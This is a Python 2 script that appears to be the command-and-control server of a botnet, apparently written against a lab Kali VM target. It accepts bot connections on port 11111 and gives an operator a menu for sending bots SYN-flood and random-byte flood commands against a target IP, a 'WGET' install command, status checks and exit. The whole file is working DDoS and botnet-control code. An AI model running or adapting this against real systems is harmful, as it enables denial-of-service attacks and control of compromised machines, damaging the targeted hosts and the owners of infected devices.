import socket
import threading

TARGET = ' '#IP Address of Kali Linux target VM to be read from the config file

with open("Config.txt", 'r') as file:
	content = file.readline()
	TARGET = content[16:]
	TARGET = TARGET.rstrip()


def connectbot(clientsocketsource):
	while True:
		data = clientsocketsource.recv(1024)
		print("Data receieved from bot: {}".format(data))


def sendcommands(clientsocketsaddresssource):
	while True:
		print("Choose the type of command to execute ")
		print("1) SYN Flood\n 2) Install content using wget \n 3) Get status of bot \n 4) Flooding of random bytes \n 5) Exit server")

		input_get = raw_input()
		for row in clientsocketsaddresssource:
			if int(input_get) == 1:
				duration = raw_input("Enter the duration of the attack in seconds: ")
				numberofbots = raw_input("Enter the number of bots to send this to: ")
				command = "\t".join(("SYN FLOOD", str(duration), str(numberofbots), TARGET))
				row.send(command)

			if int(input_get) == 2:
				row.send("WGET")

			if int(input_get) == 3:
				row.send("STATUS")

			if int(input_get) == 4:
				row.send("\t".join(("FLOODING",TARGET)))

			if int(input_get) == 5:
				row.send("EXIT")
				break


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.bind(('',11111))

s.listen(300)

udpsocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #Create UDP socket for UDP based attacks
udpsocket.bind(('',0)) #Bind to all interfaces and let the OS choose the port

listofbots = list()
referencestosockets = list()

commandsender = threading.Thread(target=sendcommands, args=(referencestosockets,))
commandsender.start()

while True:
	(clientsocket,address) = s.accept()
	referencestosockets.append(clientsocket)
	print('{} is connected'.format(address))
	t = threading.Thread(target=connectbot,args=(clientsocket,))
	listofbots.append(t)
	t.start()

for index in listofbots:
	index.join()

commandsender.join()

s.close()
udpsocket.close()
